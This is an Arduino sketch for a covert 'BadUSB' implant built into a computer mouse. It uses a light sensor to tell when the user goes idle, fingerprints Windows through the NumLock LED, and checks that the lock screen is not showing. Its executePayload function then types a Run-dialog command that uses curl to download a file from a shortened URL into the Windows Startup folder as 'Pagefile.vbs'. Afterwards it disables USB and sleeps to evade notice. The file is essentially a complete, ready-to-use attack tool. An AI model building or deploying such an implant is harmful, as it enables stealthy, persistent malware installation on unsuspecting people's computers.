#include <HID-Project.h>
#include <HID-Settings.h>
#include <avr/sleep.h>
#include <avr/power.h>
#include <avr/wdt.h>
#include <avr/interrupt.h>
#include <EEPROM.h>

// pinouts (do NOT change)
const int photoTransistorPin = A2;
const int VCCPin = 15;                     // using pin 15 as VCC
const int GNDPin = 16;                     // using pin 16 as GND

// mouse variables (change accordingly)
const unsigned long interval = 500;        // interval at which to check sensor (milliseconds)
const unsigned long bootTime = 5000;      // time in milliseconds to wait before the script activates (wait time for PC to boot)
const unsigned long inactiveTime = 5000;  // time in milliseconds after which mouse is considered inactive
const unsigned long lockToCoverScreenTime = 65000; // time in milliseconds to wait for the Windows lock screen to return to the cover screen
const unsigned long activeSensorCount = 500; // how many times should the sensor increment before the mouse is deemed active
const int activeSensorValue = 1016;              // the maximum value the sensor should read that indicates the mouse is active (this will be deprecated when no longer using photosensor)

// Other mouse variables (do NOT change)
bool initialNumLockStatus;                 // stores the initial status of the numlock LED
bool currentNumLockStatus;                 // stores the current status of the numlock LED
unsigned long previousMillis = 0;          // will store the last time the sensor was checked
int sensorCount = 0;                       // count of how many times the sensor value is activeSensorValue or less
bool mouseActive = 0;                      // boolean value to show whether the mouse is active or inactive

void disableUSB() {
  USBCON |= (1 << FRZCLK);  // freeze the USB clock
  PLLCSR &= ~(1 << PLLE);   // disable the USB PLL
  USBCON &= ~(1 << USBE);   // disable the USB controller
}

void enterSleepMode() {
  set_sleep_mode(SLEEP_MODE_PWR_DOWN);  // set the sleep mode
  sleep_enable();                       // enable sleep mode
  sei();                                // enable global interrupts
  sleep_cpu();                          // put the Arduino to sleep
  sleep_disable();                      // disable sleep mode after waking up
}

void executePayload() {
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);  // press the Windows key
  delay(30);
  Keyboard.press('r');    // press the R key
  delay(30);              // delay for a short time to let the keys register
  Keyboard.releaseAll();  // release all keys
  delay(1500);            // wait for the Run dialog to appear
  // type in the payload string and press Enter
  Keyboard.print("cmd /c curl -L https://tinyurl.com/ms6u6hr3 -o \"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/Pagefile.vbs\" >nul 2>&1");
  delay(30);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Serial.println("Script finished. Registering this in EEPROM and killing device...");
  // script is finished

  // sleep for 100 milliseconds
  delay(100);

  //EEPROM.write(0, 1); // write a 1 to the first EEPROM address to signify that the script has been executed
  delay(30);

  // disable the USB interface
  disableUSB();
  delay(30);

  // put the device into sleep mode to disable keyboard
  enterSleepMode();

  // enter an infinite loop in case sleep mode fails
  for (;;) {
    delay(1000);
  }
}

void checkEEPROM() {
  // this function checks if the payload has already been executed
  // if the payload has already executed, then the arduino disables itself upon receiving power from the mouse
  // check if pin 8 is shorted (LOW). If it is shorted, then reset the EEPROM
  if (digitalRead(8) == LOW) {
    // pin 8 is shorted, resetting EEPROM and proceeding
    EEPROM.write(0, 0);  // Write a 0 to the first EEPROM address to signify that the script has been reset
    delay(30);

  } else if (EEPROM.read(0) == 1) {
    // EEPROM indicates script has already been executed, disabling device
    disableUSB();
    delay(30);
    enterSleepMode();

    // enter an infinite loop in case sleep mode fails
    for (;;) {
      delay(1000);
    }
  }
}

void checkIfWindowsPC() {
  // check if the PC is a Windows machine through keyboard method
  // if this check fails, do not proceed further
  initialNumLockStatus = BootKeyboard.getLeds() & LED_NUM_LOCK;
  BootKeyboard.press(KEY_LEFT_CTRL);
  BootKeyboard.press(KEY_NUM_LOCK);
  BootKeyboard.releaseAll();

  delay(100);  // give time for the LED status to change

  currentNumLockStatus = BootKeyboard.getLeds() & LED_NUM_LOCK;

  // initiate check for Windows machine

  if (currentNumLockStatus != initialNumLockStatus) {
    // not a Windows machine, enter standby
    Serial.println("Not a Windows machine, don't do anything.");
    // reset the numlock back to its original position
    BootKeyboard.press(KEY_NUM_LOCK);
    BootKeyboard.releaseAll();
    delay(100);
    // put device in an infinite loop with a 1 second delay per loop
    // it may also be advisable to shut off the arduino to prevent detection, but this disconnect may alert the user as well
    for (;;) {
      delay(1000);
    }
  } else {
    Serial.println("Windows machine detected, continuing...");
  }
}

bool isLockScreen() {
  // check if Windows is currently on the lockscreen
  bool previousNumLockStatus = BootKeyboard.getLeds() & LED_NUM_LOCK;
  BootKeyboard.press(KEY_NUM_LOCK);
  delay(2000);  // hold for 2 seconds
  BootKeyboard.release(KEY_NUM_LOCK);

  delay(100);  // give time for the LED status to change

  bool newNumLockStatus = BootKeyboard.getLeds() & LED_NUM_LOCK;

  if (newNumLockStatus == previousNumLockStatus) {
    Serial.println("Lockscreen detected.");
    return true;
  } else {
    Serial.println("Logged in.");
    return false;
  }
}

void waitUntilMouseActive() {
    // mouse sensing portion here

    unsigned long lastActiveMillis = millis();  // will store the last time the mouse was active

    while (mouseActive == 0) {

      unsigned long currentMillis = millis();

      if (currentMillis - previousMillis >= interval) {
        previousMillis = currentMillis;  // save the last time the sensor was checked
        //Serial.println(sensorCount);

        //Serial.println("Current and last active and previous: ");
        //Serial.println(currentMillis);
        //Serial.println(lastActiveMillis);
        //Serial.println(previousMillis);

        // if the sensor count is more than activeSensorCount, the mouse is active
        if (sensorCount >= activeSensorCount) {
          Serial.println("Mouse is now active, continuing...");
          //Serial.println(currentMillis);
          //Serial.println(lastActiveMillis);
          sensorCount = 0; // reset the sensor count
          lastActiveMillis = currentMillis;
          mouseActive = 1;
          //break; // break out of the while loop
          // update the last time the mouse was active
        } else if (currentMillis - lastActiveMillis >= inactiveTime) {  // If the mouse has been inactive for equal to or more than inactiveTime seconds
          // the mouse is now inactive
          //Serial.println(currentMillis);
          //Serial.println(lastActiveMillis);
          Serial.println("Mouse is still inactive. Checking again...");
          sensorCount = 0; // reset the sensor count
        }
        sensorCount = 0;  // reset the sensor count
      }

      // read the input on the phototransistor pin:
      int sensorValue = analogRead(photoTransistorPin);

      // if the sensor value is activeSensorValue or less, increment the sensor count
      // the reason for this is that if the sensor value is less than or equal to the activeSensorValue, the mouse is likely active
      if (sensorValue <= activeSensorValue) {
        sensorCount++;
      }
    }
  // once this function is broken out of, the mouse is now active
}

void waitUntilMouseInactive() {
    // mouse sensing portion here
    unsigned long lastActiveMillis = millis();  // will store the last time the mouse was active

    while (mouseActive == 1) {

      unsigned long currentMillis = millis();

      if (currentMillis - previousMillis >= interval) {
        previousMillis = currentMillis;  // save the last time the sensor was checked
        //Serial.println(sensorCount);

        //Serial.println("Current and last active and previous: ");
        //Serial.println(currentMillis);
        //Serial.println(lastActiveMillis);
        //Serial.println(previousMillis);

        // if the sensor count is more than activeSensorCount, the mouse is active
        if (sensorCount >= activeSensorCount) {
          Serial.println("Mouse is still active. Checking again...");
          //Serial.println(currentMillis);
          //Serial.println(lastActiveMillis);
          sensorCount = 0; // reset the sensor count
          lastActiveMillis = currentMillis;
          // update the last time the mouse was active
        } else if (currentMillis - lastActiveMillis >= inactiveTime) {  // If the mouse has been inactive for equal to or more than inactiveTime seconds
          // the mouse is now inactive
          //Serial.println(currentMillis);
          //Serial.println(lastActiveMillis);
          Serial.println("Mouse is now inactive, continuing...");
          sensorCount = 0; // reset the sensor count
          mouseActive = 0;
          //break; // break out of the while loop
        }
        sensorCount = 0;  // reset the sensor count
      }

      // read the input on the phototransistor pin:
      int sensorValue = analogRead(photoTransistorPin);

      // if the sensor value is activeSensorValue or less, increment the sensor count
      // the reason for this is that if the sensor value is less than or equal to the activeSensorValue, the mouse is likely active
      if (sensorValue <= activeSensorValue) {
        sensorCount++;
      }
    }
  // once this function is broken out of, the mouse is now inactive

}

void setup() {
  // configure pin 8 as an input pin with internal pull-up resistor
  pinMode(8, INPUT_PULLUP);

  delay(100);

  // check the EEPROM to see if the payload has been previously executed
  checkEEPROM();

  // passed the EEPROM check

  // begin a serial connection to print out debug statements (DEBUG ONLY, DISABLE THIS LATER)
  Serial.begin(9600);

  // mouse sensing initiation

  pinMode(VCCPin, OUTPUT);
  digitalWrite(VCCPin, HIGH);  // set the pin to 5V

  pinMode(GNDPin, OUTPUT);
  digitalWrite(GNDPin, LOW);  // set the pin to GND

  pinMode(LED_BUILTIN_TX, INPUT);  // detach built-in LED on pin 1 (TX)

  pinMode(LED_BUILTIN_RX, INPUT);  // detach built-in LED on pin 0 (RX)

  // end of mouse sensing portion

  delay(bootTime);  // wait for bootTime seconds to give the PC time to boot

  // pc has now booted

  // initiate the keyboard driver
  BootKeyboard.begin();

  // initial wait to see when mouse becomes active before beginning checks
  waitUntilMouseActive();

  // now wait until the mouse becomes inactive to see if PC is Windows based
  waitUntilMouseInactive();

  // check if connected device is Windows based PC through keyboard method
  checkIfWindowsPC();

}

void loop() {
  delay(lockToCoverScreenTime);  // wait for lockToCoverScreenTime seconds to make sure lock screen has gone back to cover screen

  if (isLockScreen()) {
    Serial.println("Lockscreen detected. Waiting for mouse activity and then check again after " + String(inactiveTime) + " seconds of inactivity...");
    waitUntilMouseActive();
    Serial.println("Mouse is now active. Waiting for mouse to become inactive...");
    waitUntilMouseInactive();
    Serial.println("Mouse is now inactive. Checking if logged in after " + String(lockToCoverScreenTime) + " seconds...");
  } else {
    Serial.println("Now logged in. Wait for mouse to go inactive...");
    waitUntilMouseInactive();
    Serial.println("Mouse is now inactive. Checking to see if logged in prior to payload execution...");
    if(!isLockScreen()) { // mouse is both inactive and not on the lock screen
      // execute the bad usb payload
      executePayload();
    }
  }
}